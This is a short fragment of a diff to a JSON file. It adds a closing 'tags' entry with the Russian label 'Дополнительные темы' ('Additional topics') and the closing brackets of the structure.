+      "tags": ["Дополнительные темы"]
+    }
+  ]
+}
